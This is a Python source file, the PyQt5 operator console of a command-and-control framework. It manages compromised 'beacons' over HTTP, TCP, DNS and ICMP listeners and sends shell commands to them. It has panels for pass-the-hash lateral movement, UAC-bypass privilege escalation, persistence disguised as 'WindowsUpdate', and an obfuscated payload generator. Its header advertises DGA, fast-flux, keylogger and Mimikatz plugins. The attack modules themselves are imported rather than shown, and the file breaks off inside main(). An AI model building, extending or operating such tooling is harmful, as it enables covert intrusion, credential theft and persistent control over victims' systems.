#!/usr/bin/env python3
"""
C2 Server - Complete Edition
Advanced Command & Control Framework with GUI

Features:
- Multi-Protocol: HTTP, TCP, DNS, ICMP, SMB, WireGuard, mTLS
- Stealth: DGA, Fast-Flux, Jitter, Encryption, Traffic Mimicry
- Modules: Lateral Movement, Privilege Escalation, Persistence
- Plugins: Keylogger, Screenshot, Mimikatz
- Payload Generator: PowerShell, Python, EXE, DLL, Shellcode, Macro, HTA
- Dark Theme GUI with Real-time Dashboard
- SQLite Database for Persistence
"""

import sys
import os
import json
import socket
import threading
import time
import hashlib
import base64
import random
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import queue

# PyQt5 imports
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtChart import *

# ============================================================================
# IMPORT DARI FOLDER-FOLDER
# ============================================================================

# Core
from core.database import C2Database

# Protocols
from protocols.http_handler import HTTPProtocolHandler
from protocols.tcp_handler import TCPProtocolHandler
from protocols.dns_handler import DNSProtocolHandler
from protocols.icmp_handler import ICMPProtocolHandler
from protocols.wireguard_handler import WireGuardProtocolHandler
from protocols.smb_handler import SMBProtocolHandler
from protocols.mtls_handler import MTLSProtocolHandler

# Modules
from modules.lateral import LateralMovementModule
from modules.privilege import PrivilegeEscalationModule
from modules.persistence import PersistenceModule
from modules.payload_gen import PayloadGenerator
from modules.module_system import ModuleManager

# Stealth
from stealth.stealth import StealthManager

# ============================================================================
# ENUMS & DATA STRUCTURES
# ============================================================================

class BeaconStatus(Enum):
    OFFLINE = "offline"
    ONLINE = "online"
    IDLE = "idle"
    COMPROMISED = "compromised"
    DEAD = "dead"

class CommandStatus(Enum):
    PENDING = "pending"
    SENT = "sent"
    EXECUTED = "executed"
    FAILED = "failed"
    TIMEOUT = "timeout"

class Protocol(Enum):
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    TCP = "tcp"
    SMB = "smb"
    MTLS = "mtls"
    WIREGUARD = "wireguard"
    ICMP = "icmp"

@dataclass
class Beacon:
    beacon_id: str
    hostname: str
    username: str
    os_type: str
    os_version: str
    architecture: str
    ip_address: str
    pid: int
    protocol: Protocol
    last_beacon: float
    status: BeaconStatus = BeaconStatus.OFFLINE
    integrity_level: str = "user"
    is_admin: bool = False
    sessions_open: int = 0
    processes_running: int = 0
    tags: List[str] = field(default_factory=list)
    notes: str = ""
    created_at: float = field(default_factory=time.time)

@dataclass
class Command:
    command_id: str
    beacon_id: str
    command_type: str
    command_args: str
    status: CommandStatus = CommandStatus.PENDING
    timestamp: float = field(default_factory=time.time)
    executed_at: Optional[float] = None
    output: str = ""
    error_msg: str = ""

# ============================================================================
# DARK THEME
# ============================================================================

DARK_THEME = """
QMainWindow, QDialog {
    background-color: #0d1117;
    color: #c9d1d9;
}
QWidget {
    background-color: #0d1117;
    color: #c9d1d9;
}
QMenuBar {
    background-color: #161b22;
    color: #c9d1d9;
    border-bottom: 1px solid #30363d;
}
QMenuBar::item:selected {
    background-color: #21262d;
}
QMenu {
    background-color: #161b22;
    color: #c9d1d9;
    border: 1px solid #30363d;
}
QMenu::item:selected {
    background-color: #1f6feb;
    color: #ffffff;
}
QTreeWidget, QTableWidget, QListWidget {
    background-color: #0d1117;
    color: #c9d1d9;
    border: 1px solid #30363d;
    gridline-color: #21262d;
}
QTreeWidget::item:selected, QTableWidget::item:selected {
    background-color: #1f6feb;
    color: #ffffff;
}
QTextEdit, QLineEdit {
    background-color: #0d1117;
    color: #c9d1d9;
    border: 1px solid #30363d;
    padding: 5px;
    border-radius: 4px;
}
QTextEdit:focus, QLineEdit:focus {
    border: 1px solid #1f6feb;
}
QPushButton {
    background-color: #21262d;
    color: #c9d1d9;
    border: 1px solid #30363d;
    border-radius: 4px;
    padding: 6px 12px;
    font-weight: bold;
}
QPushButton:hover {
    background-color: #30363d;
}
QPushButton:pressed {
    background-color: #1f6feb;
    color: #ffffff;
}
QPushButton.btn-danger {
    background-color: #da3633;
    color: #ffffff;
}
QPushButton.btn-danger:hover {
    background-color: #f85149;
}
QPushButton.btn-success {
    background-color: #2ea043;
    color: #ffffff;
}
QPushButton.btn-success:hover {
    background-color: #3fb950;
}
QComboBox {
    background-color: #0d1117;
    color: #c9d1d9;
    border: 1px solid #30363d;
    border-radius: 4px;
    padding: 4px;
}
QHeaderView::section {
    background-color: #161b22;
    color: #8b949e;
    padding: 5px;
    border: none;
    border-right: 1px solid #30363d;
}
QTabBar::tab {
    background-color: #161b22;
    color: #8b949e;
    padding: 8px 16px;
    border: 1px solid #30363d;
    border-bottom: none;
    border-radius: 4px 4px 0 0;
}
QTabBar::tab:selected {
    background-color: #0d1117;
    color: #c9d1d9;
    border-bottom: 2px solid #1f6feb;
}
QStatusBar {
    background-color: #161b22;
    color: #8b949e;
    border-top: 1px solid #30363d;
}
QGroupBox {
    border: 1px solid #30363d;
    border-radius: 6px;
    margin-top: 10px;
    padding-top: 10px;
}
QGroupBox::title {
    subcontrol-origin: margin;
    left: 10px;
    padding: 0 8px;
    color: #8b949e;
}
.status_online { color: #3fb950; }
.status_offline { color: #f85149; }
.status_idle { color: #d29922; }
.status_dead { color: #484f58; }
.badge {
    padding: 2px 8px;
    border-radius: 10px;
    font-size: 0.8em;
}
.badge-success { background: #2ea043; color: #ffffff; }
.badge-danger { background: #da3633; color: #ffffff; }
.badge-warning { background: #d29922; color: #ffffff; }
.badge-info { background: #1f6feb; color: #ffffff; }
"""

# ============================================================================
# MAIN C2 CONTROL PANEL
# ============================================================================

class C2ControlPanel(QMainWindow):
    """Main C2 Server GUI"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Advanced C2 Framework - Complete Edition")
        self.setGeometry(50, 50, 1600, 900)
        
        # ===== Database =====
        self.db = C2Database()
        self.beacons: Dict[str, Beacon] = {}
        self.commands: Dict[str, Command] = {}
        self.current_beacon: Optional[Beacon] = None
        
        # ===== Modules =====
        self.lateral = LateralMovementModule(self)
        self.privilege = PrivilegeEscalationModule(self)
        self.persistence = PersistenceModule(self)
        self.payload_gen = PayloadGenerator()
        self.module_manager = ModuleManager("plugins")
        self.stealth = StealthManager()
        
        # ===== Protocol Handlers =====
        self.protocols = {}
        self.init_protocols()
        
        # ===== UI Setup =====
        self.setup_ui()
        self.setup_stylesheet()
        self.setup_menu_bar()
        
        # ===== Start Protocol Listeners =====
        self.start_listeners()
        
        # ===== Start Modules =====
        self.start_modules()
        
        # ===== Status Timer =====
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_beacon_status)
        self.status_timer.start(5000)
        
        # ===== Load Beacons =====
        self.load_beacons()
        
        self.log("INFO", "=" * 60)
        self.log("INFO", "🚀 C2 Framework Complete Edition Started")
        self.log("INFO", "=" * 60)
        self.log("INFO", "📡 HTTP Listener: 0.0.0.0:8080")
        self.log("INFO", "📡 TCP Listener:  0.0.0.0:4444")
        self.log("INFO", "📡 DNS Listener:  0.0.0.0:53 (requires root)")
        self.log("INFO", "📡 ICMP Listener: (requires root)")
        self.log("INFO", f"📦 Payloads directory: {os.path.abspath('payloads')}")
        self.log("INFO", f"💾 Database: {os.path.abspath('data/c2_framework.db')}")
        self.log("INFO", "=" * 60)
        
        self.status_label.setText("✅ Ready | Beacons: 0 | Protocols: HTTP, TCP, DNS, ICMP")
    
    def init_protocols(self):
        """Initialize all protocol handlers"""
        # HTTP
        self.http_handler = HTTPProtocolHandler(port=8080)
        self.http_handler.beacon_callback = self.on_beacon_received
        self.http_handler.log_callback = self.log
        self.protocols['http'] = self.http_handler
        
        # TCP
        self.tcp_handler = TCPProtocolHandler(port=4444)
        self.tcp_handler.beacon_callback = self.on_beacon_received
        self.tcp_handler.log_callback = self.log
        self.protocols['tcp'] = self.tcp_handler
        
        # DNS
        self.dns_handler = DNSProtocolHandler(domain="c2.example.com")
        self.dns_handler.beacon_callback = self.on_beacon_received
        self.dns_handler.log_callback = self.log
        self.protocols['dns'] = self.dns_handler
        
        # ICMP
        self.icmp_handler = ICMPProtocolHandler(pattern="PING")
        self.protocols['icmp'] = self.icmp_handler
        
        # SMB
        self.smb_handler = SMBProtocolHandler()
        self.protocols['smb'] = self.smb_handler
        
        # WireGuard
        self.wireguard_handler = WireGuardProtocolHandler()
        self.protocols['wireguard'] = self.wireguard_handler
        
        # mTLS
        self.mtls_handler = MTLSProtocolHandler()
        self.protocols['mtls'] = self.mtls_handler
    
    def start_listeners(self):
        """Start all protocol listeners"""
        # Start HTTP
        threading.Thread(target=self.http_handler.start, daemon=True).start()
        
        # Start TCP
        threading.Thread(target=self.tcp_handler.start, daemon=True).start()
        
        # Start DNS (requires root)
        try:
            threading.Thread(target=self.dns_handler.start, daemon=True).start()
        except:
            self.log("WARNING", "[-] DNS listener requires root privileges")
        
        # Start ICMP (requires root)
        try:
            threading.Thread(target=self.icmp_handler.start, daemon=True).start()
        except:
            self.log("WARNING", "[-] ICMP listener requires root privileges")
    
    def start_modules(self):
        """Start all modules"""
        # Start Module Manager
        self.module_manager.load_all_modules()
        for module_name in self.module_manager.get_all_modules():
            self.module_manager.start_module_thread(module_name, {'interval': 30})
            self.log("INFO", f"[+] Started module: {module_name}")
    
    # ===== UI SETUP =====
    
    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout()
        
        # ===== LEFT PANEL =====
        left = QWidget()
        left.setMaximumWidth(400)
        left_layout = QVBoxLayout()
        
        # Header
        header = QLabel("🎯 Active Beacons")
        header.setFont(QFont("Arial", 12, QFont.Bold))
        left_layout.addWidget(header)
        
        # Beacon Tree
        self.beacons_tree = QTreeWidget()
        self.beacons_tree.setHeaderLabels(["Beacon", "Status", "OS", "User"])
        self.beacons_tree.setColumnCount(4)
        self.beacons_tree.setSelectionMode(QAbstractItemView.SingleSelection)
        self.beacons_tree.itemSelectionChanged.connect(self.on_beacon_selected)
        left_layout.addWidget(self.beacons_tree)
        
        # Actions
        actions = QHBoxLayout()
        self.btn_refresh = QPushButton("🔄 Refresh")
        self.btn_refresh.clicked.connect(self.load_beacons)
        actions.addWidget(self.btn_refresh)
        
        self.btn_kill = QPushButton("💀 Kill")
        self.btn_kill.setProperty("class", "btn-danger")
        self.btn_kill.clicked.connect(self.kill_beacon)
        actions.addWidget(self.btn_kill)
        
        self.btn_export = QPushButton("📤 Export")
        self.btn_export.clicked.connect(self.export_beacons)
        actions.addWidget(self.btn_export)
        
        left_layout.addLayout(actions)
        
        # Stats
        stats = QGroupBox("📊 Statistics")
        stats_layout = QGridLayout()
        self.total_label = QLabel("Total: 0")
        self.active_label = QLabel("Active: 0")
        self.idle_label = QLabel("Idle: 0")
        self.offline_label = QLabel("Offline: 0")
        stats_layout.addWidget(self.total_label, 0, 0)
        stats_layout.addWidget(self.active_label, 0, 1)
        stats_layout.addWidget(self.idle_label, 1, 0)
        stats_layout.addWidget(self.offline_label, 1, 1)
        stats.setLayout(stats_layout)
        left_layout.addWidget(stats)
        
        left.setLayout(left_layout)
        
        # ===== RIGHT PANEL =====
        right = QWidget()
        right_layout = QVBoxLayout()
        
        self.tabs = QTabWidget()
        
        # Console Tab
        self.tabs.addTab(self.create_console_tab(), "💻 Console")
        
        # Lateral Tab
        self.tabs.addTab(self.create_lateral_tab(), "🔗 Lateral")
        
        # Privilege Tab
        self.tabs.addTab(self.create_priv_tab(), "🔐 Priv Esc")
        
        # Persistence Tab
        self.tabs.addTab(self.create_persist_tab(), "🔄 Persist")
        
        # Payload Tab
        self.tabs.addTab(self.create_payload_tab(), "📦 Payload")
        
        # Logs Tab
        self.tabs.addTab(self.create_logs_tab(), "📋 Logs")
        
        right_layout.addWidget(self.tabs)
        right.setLayout(right_layout)
        
        # Splitter
        splitter = QSplitter(Qt.Horizontal)
        splitter.addWidget(left)
        splitter.addWidget(right)
        splitter.setSizes([400, 1200])
        main_layout.addWidget(splitter)
        central.setLayout(main_layout)
        
        # Status Bar
        self.statusbar = self.statusBar()
        self.status_label = QLabel("Loading...")
        self.statusbar.addWidget(self.status_label)
        
        # Stats in status bar
        self.status_stats = QLabel("")
        self.statusbar.addPermanentWidget(self.status_stats)
    
    def create_console_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout()
        
        # Command History
        layout.addWidget(QLabel("📜 Command History"))
        self.cmd_history = QListWidget()
        self.cmd_history.setMaximumHeight(150)
        layout.addWidget(self.cmd_history)
        
        # Command Input
        input_layout = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Enter command (e.g. whoami, ipconfig, ls -la)")
        self.cmd_input.returnPressed.connect(self.execute_command)
        input_layout.addWidget(self.cmd_input)
        
        self.btn_execute = QPushButton("▶ Execute")
        self.btn_execute.clicked.connect(self.execute_command)
        self.btn_execute.setProperty("class", "btn-success")
        input_layout.addWidget(self.btn_execute)
        layout.addLayout(input_layout)
        
        # Output
        layout.addWidget(QLabel("📤 Output"))
        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setFont(QFont("Courier New", 10))
        layout.addWidget(self.console_output)
        
        widget.setLayout(layout)
        return widget
    
    def create_lateral_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout()
        
        layout.addWidget(QLabel("🔗 Lateral Movement"))
        
        grid = QGridLayout()
        grid.addWidget(QLabel("Method:"), 0, 0)
        self.lateral_method = QComboBox()
        self.lateral_method.addItems(["pass_the_hash", "wmi", "winrm", "ssh", "smb", "rdp"])
        grid.addWidget(self.lateral_method, 0, 1)
        
        grid.addWidget(QLabel("Target:"), 1, 0)
        self.lateral_target = QLineEdit()
        self.lateral_target.setPlaceholderText("Target IP/Hostname")
        grid.addWidget(self.lateral_target, 1, 1)
        
        grid.addWidget(QLabel("Username:"), 2, 0)
        self.lateral_username = QLineEdit()
        self.lateral_username.setPlaceholderText("Username")
        grid.addWidget(self.lateral_username, 2, 1)
        
        grid.addWidget(QLabel("Password/Hash:"), 3, 0)
        self.lateral_password = QLineEdit()
        self.lateral_password.setPlaceholderText("Password or NTLM Hash")
        self.lateral_password.setEchoMode(QLineEdit.Password)
        grid.addWidget(self.lateral_password, 3, 1)
        
        self.btn_lateral = QPushButton("▶ Execute Lateral Movement")
        self.btn_lateral.clicked.connect(self.execute_lateral)
        self.btn_lateral.setProperty("class", "btn-primary")
        grid.addWidget(self.btn_lateral, 4, 0, 1, 2)
        
        layout.addLayout(grid)
        
        self.lateral_output = QTextEdit()
        self.lateral_output.setReadOnly(True)
        layout.addWidget(self.lateral_output)
        
        widget.setLayout(layout)
        return widget
    
    def create_priv_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout()
        
        layout.addWidget(QLabel("🔐 Privilege Escalation"))
        
        grid = QGridLayout()
        grid.addWidget(QLabel("Method:"), 0, 0)
        self.priv_method = QComboBox()
        self.priv_method.addItems(["uac_bypass", "token_manipulation", "potato", "kernel_exploit"])
        grid.addWidget(self.priv_method, 0, 1)
        
        grid.addWidget(QLabel("Args (JSON):"), 1, 0)
        self.priv_args = QLineEdit()
        self.priv_args.setPlaceholderText('{"technique": "fodhelper"}')
        grid.addWidget(self.priv_args, 1, 1)
        
        self.btn_priv = QPushButton("▶ Execute Privilege Escalation")
        self.btn_priv.clicked.connect(self.execute_privilege)
        self.btn_priv.setProperty("class", "btn-warning")
        grid.addWidget(self.btn_priv, 2, 0, 1, 2)
        
        layout.addLayout(grid)
        
        self.priv_output = QTextEdit()
        self.priv_output.setReadOnly(True)
        layout.addWidget(self.priv_output)
        
        widget.setLayout(layout)
        return widget
    
    def create_persist_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout()
        
        layout.addWidget(QLabel("🔄 Persistence Mechanisms"))
        
        grid = QGridLayout()
        grid.addWidget(QLabel("Method:"), 0, 0)
        self.persist_method = QComboBox()
        self.persist_method.addItems(["registry", "scheduled_task", "service", "startup", "cron", "systemd"])
        grid.addWidget(self.persist_method, 0, 1)
        
        grid.addWidget(QLabel("Args (JSON):"), 1, 0)
        self.persist_args = QLineEdit()
        self.persist_args.setPlaceholderText('{"name": "WindowsUpdate"}')
        grid.addWidget(self.persist_args, 1, 1)
        
        self.btn_persist = QPushButton("▶ Setup Persistence")
        self.btn_persist.clicked.connect(self.execute_persistence)
        self.btn_persist.setProperty("class", "btn-primary")
        grid.addWidget(self.btn_persist, 2, 0, 1, 2)
        
        layout.addLayout(grid)
        
        self.persist_output = QTextEdit()
        self.persist_output.setReadOnly(True)
        layout.addWidget(self.persist_output)
        
        widget.setLayout(layout)
        return widget
    
    def create_payload_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout()
        
        layout.addWidget(QLabel("📦 Payload Generator"))
        
        grid = QGridLayout()
        grid.addWidget(QLabel("Format:"), 0, 0)
        self.payload_type = QComboBox()
        self.payload_type.addItems(["powershell", "python", "exe", "dll", "shellcode", "macro", "hta"])
        grid.addWidget(self.payload_type, 0, 1)
        
        grid.addWidget(QLabel("C2 Server:"), 1, 0)
        self.payload_c2 = QLineEdit("127.0.0.1")
        grid.addWidget(self.payload_c2, 1, 1)
        
        grid.addWidget(QLabel("Port:"), 2, 0)
        self.payload_port = QSpinBox()
        self.payload_port.setRange(1, 65535)
        self.payload_port.setValue(8080)
        grid.addWidget(self.payload_port, 2, 1)
        
        grid.addWidget(QLabel("Obfuscation:"), 3, 0)
        self.payload_obf = QComboBox()
        self.payload_obf.addItems(["base64", "xor", "none"])
        grid.addWidget(self.payload_obf, 3, 1)
        
        self.btn_payload = QPushButton("▶ Generate Payload")
        self.btn_payload.clicked.connect(self.generate_payload)
        self.btn_payload.setProperty("class", "btn-success")
        grid.addWidget(self.btn_payload, 4, 0, 1, 2)
        
        layout.addLayout(grid)
        
        self.payload_output = QTextEdit()
        self.payload_output.setReadOnly(True)
        layout.addWidget(self.payload_output)
        
        widget.setLayout(layout)
        return widget
    
    def create_logs_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout()
        
        layout.addWidget(QLabel("📋 Operation Logs"))
        
        controls = QHBoxLayout()
        self.btn_clear_logs = QPushButton("🗑 Clear Logs")
        self.btn_clear_logs.clicked.connect(self.clear_logs)
        controls.addStretch()
        controls.addWidget(self.btn_clear_logs)
        layout.addLayout(controls)
        
        self.logs_output = QTextEdit()
        self.logs_output.setReadOnly(True)
        self.logs_output.setFont(QFont("Courier New", 9))
        layout.addWidget(self.logs_output)
        
        widget.setLayout(layout)
        return widget
    
    def setup_stylesheet(self):
        self.setStyleSheet(DARK_THEME)
    
    def setup_menu_bar(self):
        menubar = self.menuBar()
        
        # File Menu
        file_menu = menubar.addMenu("📁 File")
        
        gen_payload = QAction("📦 Generate Payload", self)
        gen_payload.triggered.connect(self.generate_payload)
        file_menu.addAction(gen_payload)
        
        file_menu.addSeparator()
        
        export_action = QAction("📤 Export Data", self)
        export_action.triggered.connect(self.export_data)
        file_menu.addAction(export_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("❌ Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # View Menu
        view_menu = menubar.addMenu("👁 View")
        
        refresh_action = QAction("🔄 Refresh Beacons", self)
        refresh_action.triggered.connect(self.load_beacons)
        view_menu.addAction(refresh_action)
        
        clear_logs_action = QAction("🗑 Clear Logs", self)
        clear_logs_action.triggered.connect(self.clear_logs)
        view_menu.addAction(clear_logs_action)
        
        # Tools Menu
        tools_menu = menubar.addMenu("🔧 Tools")
        
        module_action = QAction("🧩 Module Manager", self)
        module_action.triggered.connect(self.show_module_manager)
        tools_menu.addAction(module_action)
        
        stealth_action = QAction("🕵️ Stealth Settings", self)
        stealth_action.triggered.connect(self.show_stealth_settings)
        tools_menu.addAction(stealth_action)
        
        # Help Menu
        help_menu = menubar.addMenu("❓ Help")
        
        about_action = QAction("ℹ️ About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
    
    # ===== BEACON MANAGEMENT =====
    
    def on_beacon_received(self, beacon: Beacon):
        """Handle incoming beacon"""
        self.beacons[beacon.beacon_id] = beacon
        self.db.add_beacon(beacon)
        self.load_beacons()
        self.log("SUCCESS", f"[+] New beacon: {beacon.hostname} ({beacon.beacon_id}) from {beacon.ip_address}")
        
        # Update status
        total = len(self.beacons)
        active = sum(1 for b in self.beacons.values() if b.status == BeaconStatus.ONLINE)
        self.status_label.setText(f"✅ Ready | Beacons: {total} | Active: {active}")
    
    def load_beacons(self):
        """Load beacons from database"""
        self.beacons = {}
        for beacon in self.db.get_beacons():
            self.beacons[beacon.beacon_id] = beacon
        self.update_beacon_tree()
    
    def update_beacon_tree(self):
        """Update beacon tree widget"""
        self.beacons_tree.clear()
        
        total = 0
        active = 0
        idle = 0
        offline = 0
        
        for beacon_id, beacon in self.beacons.items():
            total += 1
            if beacon.status == BeaconStatus.ONLINE:
                active += 1
            elif beacon.status == BeaconStatus.IDLE:
                idle += 1
            else:
                offline += 1
            
            status_icon = {
                BeaconStatus.ONLINE: "🟢",
                BeaconStatus.OFFLINE: "🔴",
                BeaconStatus.IDLE: "🟡",
                BeaconStatus.DEAD: "⚫"
            }.get(beacon.status, "❓")
            
            item = QTreeWidgetItem()
            item.setText(0, f"{status_icon} {beacon.hostname}")
            item.setText(1, f'<span class="status_{beacon.status.value}">{beacon.status.value.upper()}</span>')
            item.setText(2, beacon.os_type)
            item.setText(3, beacon.username)
            item.setData(0, Qt.UserRole, beacon_id)
            self.beacons_tree.addTopLevelItem(item)
        
        # Update stats
        self.total_label.setText(f"Total: {total}")
        self.active_label.setText(f"Active: {active}")
        self.idle_label.setText(f"Idle: {idle}")
        self.offline_label.setText(f"Offline: {offline}")
        
        self.status_stats.setText(f"Total: {total} | Active: {active} | Idle: {idle} | Offline: {offline}")
    
    def update_beacon_status(self):
        """Update beacon status based on last beacon time"""
        current_time = time.time()
        for beacon in self.beacons.values():
            if current_time - beacon.last_beacon > 300:
                beacon.status = BeaconStatus.OFFLINE
            elif current_time - beacon.last_beacon > 60:
                beacon.status = BeaconStatus.IDLE
            else:
                beacon.status = BeaconStatus.ONLINE
            self.db.add_beacon(beacon)
        self.update_beacon_tree()
    
    def on_beacon_selected(self):
        """Handle beacon selection"""
        selected = self.beacons_tree.selectedItems()
        if selected:
            item = selected[0]
            beacon_id = item.data(0, Qt.UserRole)
            if beacon_id in self.beacons:
                self.current_beacon = self.beacons[beacon_id]
                self.status_label.setText(f"✅ Selected: {self.current_beacon.hostname} ({self.current_beacon.ip_address})")
    
    def kill_beacon(self):
        """Kill selected beacon"""
        if not self.current_beacon:
            QMessageBox.warning(self, "Warning", "No beacon selected")
            return
        
        reply = QMessageBox.question(self, "Confirm",
            f"Kill beacon {self.current_beacon.hostname}?",
            QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            self.current_beacon.status = BeaconStatus.DEAD
            self.db.add_beacon(self.current_beacon)
            self.load_beacons()
            self.log("WARNING", f"[*] Beacon {self.current_beacon.hostname} killed")
    
    def export_beacons(self):
        """Export beacon data to JSON"""
        if not self.beacons:
            QMessageBox.information(self, "Info", "No beacons to export")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Export Beacons",
            f"beacons_{int(time.time())}.json", "JSON Files (*.json)")
        
        if file_path:
            data = []
            for beacon in self.beacons.values():
                data.append({
                    'beacon_id': beacon.beacon_id,
                    'hostname': beacon.hostname,
                    'username': beacon.username,
                    'ip_address': beacon.ip_address,
                    'os_type': beacon.os_type,
                    'last_seen': datetime.fromtimestamp(beacon.last_beacon).isoformat()
                })
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            self.log("INFO", f"[+] Exported {len(data)} beacons to {file_path}")
    
    # ===== COMMAND EXECUTION =====
    
    def execute_command(self):
        """Execute command on selected beacon"""
        if not self.current_beacon:
            QMessageBox.warning(self, "Warning", "No beacon selected")
            return
        
        command = self.cmd_input.text()
        if not command:
            return
        
        self.cmd_history.insertItem(0, command)
        self.console_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] $ {command}")
        self.console_output.append(f"[*] Command sent to {self.current_beacon.hostname}")
        
        # Create command record
        cmd = Command(
            command_id=hashlib.sha256(f"{time.time()}{self.current_beacon.beacon_id}".encode()).hexdigest()[:16],
            beacon_id=self.current_beacon.beacon_id,
            command_type="shell",
            command_args=command
        )
        self.commands[cmd.command_id] = cmd
        self.db.add_command(cmd)
        
        self.cmd_input.clear()
        self.log("INFO", f"[→] Command '{command}' sent to {self.current_beacon.hostname}")
    
    # ===== MODULE EXECUTION =====
    
    def execute_lateral(self):
        """Execute lateral movement"""
        if not self.current_beacon:
            QMessageBox.warning(self, "Warning", "No beacon selected")
            return
        
        method = self.lateral_method.currentText()
        target = self.lateral_target.text()
        username = self.lateral_username.text()
        password = self.lateral_password.text()
        
        if not target:
            QMessageBox.warning(self, "Warning", "Target is required")
            return
        
        credentials = {'username': username, 'password': password}
        result = self.lateral.execute(method, target, credentials)
        
        self.lateral_output.append(f"[{datetime.now()}] {result['output']}")
        self.log("INFO", f"[+] Lateral movement: {method} -> {target}")
    
    def execute_privilege(self):
        """Execute privilege escalation"""
        if not self.current_beacon:
            QMessageBox.warning(self, "Warning", "No beacon selected")
            return
        
        method = self.priv_method.currentText()
        args = {}
        if self.priv_args.text():
            try:
                args = json.loads(self.priv_args.text())
            except:
                pass
        
        result = self.privilege.execute(method, args)
        self.priv_output.append(f"[{datetime.now()}] {result['output']}")
        self.log("INFO", f"[+] Privilege escalation: {method}")
    
    def execute_persistence(self):
        """Execute persistence setup"""
        if not self.current_beacon:
            QMessageBox.warning(self, "Warning", "No beacon selected")
            return
        
        method = self.persist_method.currentText()
        args = {}
        if self.persist_args.text():
            try:
                args = json.loads(self.persist_args.text())
            except:
                pass
        
        result = self.persistence.execute(method, args)
        self.persist_output.append(f"[{datetime.now()}] {result['output']}")
        self.log("INFO", f"[+] Persistence: {method}")
    
    def generate_payload(self):
        """Generate payload"""
        payload_type = self.payload_type.currentText()
        c2_server = self.payload_c2.text()
        c2_port = self.payload_port.value()
        
        self.payload_gen.c2_server = c2_server
        self.payload_gen.c2_port = c2_port
        self.payload_gen.obfuscation = self.payload_obf.currentText()
        
        try:
            if payload_type == "powershell":
                payload = self.payload_gen.generate_powershell()
            elif payload_type == "python":
                payload = self.payload_gen.generate_python()
            elif payload_type == "exe":
                payload = self.payload_gen.generate_exe()
            elif payload_type == "dll":
                payload = self.payload_gen.generate_dll()
            elif payload_type == "shellcode":
                payload = self.payload_gen.generate_shellcode()
            elif payload_type == "macro":
                payload = self.payload_gen.generate_macro()
            elif payload_type == "hta":
                payload = self.payload_gen.generate_hta()
            else:
                payload = "Unknown payload type"
            
            self.payload_output.setText(str(payload))
            self.log("INFO", f"[+] Payload generated: {payload_type}")
            
            # Save payload
            os.makedirs("payloads", exist_ok=True)
            ext = payload_type
            filename = f"payloads/payload_{int(time.time())}.{ext}"
            with open(filename, 'w') as f:
                f.write(str(payload))
            self.log("INFO", f"[+] Payload saved: {filename}")
            
        except Exception as e:
            self.log("ERROR", f"[-] Payload generation failed: {str(e)}")
    
    # ===== LOGGING =====
    
    def log(self, level: str, message: str):
        """Log message to console and database"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        colors = {
            "ERROR": "#f85149",
            "WARNING": "#d29922",
            "SUCCESS": "#3fb950",
            "INFO": "#58a6ff"
        }
        color = colors.get(level, "#8b949e")
        
        self.logs_output.setTextColor(QColor(color))
        self.logs_output.append(f"[{timestamp}] [{level}] {message}")
        
        # Also add to console
        if level in ["ERROR", "WARNING"]:
            self.console_output.setTextColor(QColor(color))
            self.console_output.append(f"[{timestamp}] {message}")
        
        # Save to database
        self.db.log_message(level, message)
    
    def clear_logs(self):
        """Clear logs display"""
        self.logs_output.clear()
        self.log("INFO", "[*] Logs cleared")
    
    # ===== UTILITIES =====
    
    def export_data(self):
        """Export all data"""
        # Implementation for export
        pass
    
    def show_module_manager(self):
        """Show module manager dialog"""
        QMessageBox.information(self, "Module Manager",
            "Loaded Modules:\n" + "\n".join(self.module_manager.get_all_modules()))
    
    def show_stealth_settings(self):
        """Show stealth settings dialog"""
        status = self.stealth.get_status()
        QMessageBox.information(self, "Stealth Settings",
            json.dumps(status, indent=2))
    
    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(self, "About C2 Framework",
            """<h2>Advanced C2 Framework</h2>
            <p><b>Version:</b> 3.0.0</p>
            <p><b>Author:</b> Rapid</p>
            <br>
            <p><b>Features:</b></p>
            <ul>
            <li>Multi-Protocol: HTTP, TCP, DNS, ICMP, SMB, WireGuard, mTLS</li>
            <li>Stealth: DGA, Fast-Flux, Jitter, Encryption, Traffic Mimicry</li>
            <li>Lateral Movement: Pass-the-Hash, WMI, WinRM, SSH, SMB, RDP</li>
            <li>Privilege Escalation: UAC Bypass, Token Manipulation, Potato, Kernel</li>
            <li>Persistence: Registry, Scheduled Tasks, Services, Startup, Cron, Systemd</li>
            <li>Payload Generator: PowerShell, Python, EXE, DLL, Shellcode, Macro, HTA</li>
            <li>Post-Exploitation: Keylogger, Screenshot, Mimikatz</li>
            </ul>
            """)
    
    def closeEvent(self, event):
        """Handle close event"""
        reply = QMessageBox.question(self, "Exit",
            "Do you want to exit?",
            QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            self.log("INFO", "[*] Shutting down...")
            
            # Stop protocols
            for name, handler in self.protocols.items():
                try:
                    handler.stop()
                except:
                    pass
            
            # Cleanup modules
            self.module_manager.cleanup_all()
            
            event.accept()
        else:
            event.ignore()


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    app = QApplication(sys.argv)
    app.setApplicationName("C2 Framework Complete")
